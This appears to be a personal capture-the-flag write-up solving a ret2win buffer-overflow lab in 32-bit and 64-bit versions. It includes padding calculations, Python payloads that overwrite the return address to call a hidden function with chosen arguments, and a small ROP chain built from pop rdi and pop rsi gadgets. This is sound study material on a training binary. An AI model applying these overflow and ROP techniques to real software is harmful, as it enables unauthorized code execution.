#ctf #pwn 
Similar to CC 04 we need to override the return address of registrer_user to call the hacked function. We find the needed amount of padding:

![[Pasted image 20250125132655.png]]


- We make a payload with 28 bytes of padding, and then the address of hacked(). 
- From ghidra we see that we need to alter the parameters in the hacked function to get the top secret. 
![[Pasted image 20250125135420.png]]

We specify values in the payload to set the first parameter equal to 0xdeadbeef 
```
payload = 'A'*28 + '\x82\x91\x04\x08' + 'BBBB' + '\xef\xbe\xad\xde'

file = open("payload",'w')
file.write(payload)
print(payload)
```
 
And do the same with 0xc0debabe.
- then we run the program with the payload, if we look at the stack:
![[Pasted image 20250125152630.png]]
- we can see deadbeef and codebabe on our stack. 
- the comparing step we are supposed to bypass checks whats at: ebp + 8. ebp is the stack base pointer 
``` ASM
0x8049193 <hacked+17>           cmp    dword ptr [ebp + 8], 0xdeadbeef
```
- ebp is pointing to 0xffffcffc, and if we add 8 to that address we get: **0xFFFFD004**, which we see contain 0xdeadbeef. 
- The other check, checks if ebp + 0xc is equal to 0xcodebabe
```
0x804919c <hacked+26>           cmp    dword ptr [ebp + 0xc], 0xc0debabe
```
- And from the screenshot we see this is also true. 

```
└─$ ./ret2win_params < payload
Name:
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAA�BBBBﾭ޾���
This function is TOP SECRET! How did you get in here?! :O
Segmentation fault (core dumped)
```

------

#### 64bit version of the program: 
```
┌──(kali㉿windowsaids)-[~/CTF/Cryptocat/pwn/binary_exploitation_101/04-ret2win_with_params/64-bit]
└─$ file ret2win_params
ret2win_params: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c9ab2d6786356596c407f942908f9078b156d4d1, for GNU/Linux 3.2.0, not stripped
```


We can see the decompiled code is very similar:
![[Pasted image 20250125154850.png]]

- Observer the parameters has twice as many bits as the parameters in the 32 version.  

The same logic goes, we need to find the padding needed to overflow the buffer. We want our input to overwrite the RIP registry:

![[Pasted image 20250125161248.png]]

- Looking at the first 4 bytes of RSP, we find that the padding is 24. 
```
pwndbg> cyclic l daaaaaaa
Exception occurred: cyclic_cmd: No symbol "l" in current context. (<class 'pwndbg.dbg.Error'>)
For more info invoke `set exception-verbose on` and rerun the command
or debug it by yourself with `set exception-debugger on`
pwndbg> cyclic -l daaaaaaa
Finding cyclic pattern of 8 bytes: b'daaaaaaa' (hex: 0x6461616161616161)
Found at offset 24
pwndbg>
```

- NOTE: Since this is a 64 bit program, we need to setup the registries before we call the hacked function.  

- To spesify the parameters when we call the function, we need to change the values of rdi (param 1) and rsi (param 2) registry. This is different from the 32bit version when we just pushed values to the stack.

The format of the payload:
```
padding + pop_rdi + 0xdeadbeef + pop_rdi_r15 + 0xc0debabe + calling_hacked()
```

- The pop_rdi just means we pop a value from the stack and save it in rdi. To find code that lets us pop_rdi we use ropper:
![[Pasted image 20250125165656.png]]
- For the pop_rsi we dont have a tool to do it directly, we also have to send something to r15.
![[Pasted image 20250125170624.png]]

So the payload is:
```
payload = 'A'*24 + '\x4b\x12\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\x49\x12\x40\x00\x00\x00\x00\x00' + '\xbe\xba\xde\xc0\xbe\xba\xde\xc0' + 'junkjunk' + '\x42\x11\x40\x00\x00\x00\x00\x00'
```

![[Pasted image 20250125171446.png]]


